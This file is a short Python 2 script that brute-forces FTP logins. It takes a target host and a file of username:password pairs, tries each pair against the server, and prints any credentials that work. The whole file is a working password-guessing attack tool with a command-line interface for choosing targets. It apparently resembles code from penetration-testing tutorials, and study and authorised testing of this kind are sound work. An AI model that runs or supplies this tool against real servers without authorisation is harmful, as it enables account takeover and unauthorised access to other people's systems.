# -*- coding: UTF-8 -*-
import ftplib
import optparse
from threading import Thread
def bruteLogin(hostname,passwordFile):
    with open(passwordFile,'r') as f:
        for line in f.readlines():
            username = line.split(':') [0]
            password = line.split(':') [1].strip('\r').strip('\n')
            print "[+] Trying: "+username+":"+password
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(username,password)
                print '\n[+] '+str(hostname)+': FTP Logon Succeeded: '+username+":"+password
                ftp.quit()
                return (username,password)
            except Exception,e:
                pass
        print '\n[-] Could not brute force FTP credentials.'
        return (None,None)

def main():
    parse = optparse.OptionParser("usage %prog -H <target host> -P <target password>")
    parse.add_option('-H',dest='tgtHost',type='string',help='specify target host')
    parse.add_option('-P',dest='tgtPassword',type='string',help='specify target password')
    (options,args) = parse.parse_args()
    if (options.tgtHost==None)|(options.tgtPassword==None):
        print parse.usage
    else:
        host=options.tgtHost
        passwordfile=options.tgtPassword
        bruteLogin(host,passwordfile)

if __name__=='__main__':
    main()